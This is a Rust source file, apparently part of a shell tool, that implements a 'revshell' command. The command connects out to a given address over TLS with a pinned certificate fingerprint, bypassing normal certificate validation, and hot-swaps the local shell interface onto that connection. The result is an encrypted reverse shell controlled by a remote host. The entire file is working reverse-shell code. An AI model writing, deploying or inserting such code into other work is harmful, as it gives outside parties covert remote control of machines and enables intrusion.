use bufstream::BufStream;
use clap::{App, Arg, AppSettings};
use crate::{Shell, Arguments};
use crate::ctrl::Interface;
use crate::crypto::{self, OwnedTlsStream};
use crate::errors::*;
use rustls::{ClientConnection, ClientConfig, RootCertStore, ServerName};
use std::convert::TryFrom;
use std::sync::Arc;
use std::net::{TcpStream, SocketAddr};

pub fn revshell(sh: &mut Shell, args: Arguments) -> Result<()> {
    let matches = App::new("revshell")
        .setting(AppSettings::DisableVersion)
        .about("Create a tls connection and connect the interface to it")
        .arg(Arg::with_name("loop")
            .short("l")
            .long("loop")
            .help("Explicitly execute main loop again")
        )
        .arg(Arg::with_name("addr")
            .required(true)
            .help("The address to connect to")
        )
        .arg(Arg::with_name("fingerprint")
            .required(true)
            .help("The fingerprint of the certificate, see examples/fingerprint.rs")
        )
        .get_matches_from_safe(args)?;

    let addr: SocketAddr = matches.value_of("addr").unwrap().parse()?;
    let fingerprint = matches.value_of("fingerprint").unwrap();
    let run_loop = matches.occurrences_of("loop") > 0;

    let mut config = ClientConfig::builder()
        .with_safe_defaults()
        .with_root_certificates(RootCertStore::empty())
        .with_no_client_auth();
    config.dangerous().set_certificate_verifier(Arc::new(crypto::danger::PinnedCertificateVerification {}));

    let fingerprint = ServerName::try_from(fingerprint)
            .map_err(|_| anyhow!("fingerprint couldn't be converted to ServerName"))?;
    let sess = ClientConnection::new(Arc::new(config), fingerprint)?;

    shprintln!(sh, "[*] connecting to {}...", addr);
    let sock = TcpStream::connect(&addr)?;
    shprintln!(sh, "[+] connected!");

    let sock = OwnedTlsStream::new(sess, sock);
    shprintln!(sh, "[+] established encrypted connection"); // TODO: show fingerprint
    let sock = BufStream::new(sock);

    shprintln!(sh, "[*] see you on the other side...");
    sh.hotswap(Interface::Tls(Box::new(sock)));
    shprintln!(sh, "[+] hot-swapped interface");

    if run_loop {
        sh.run();
    }

    Ok(())
}
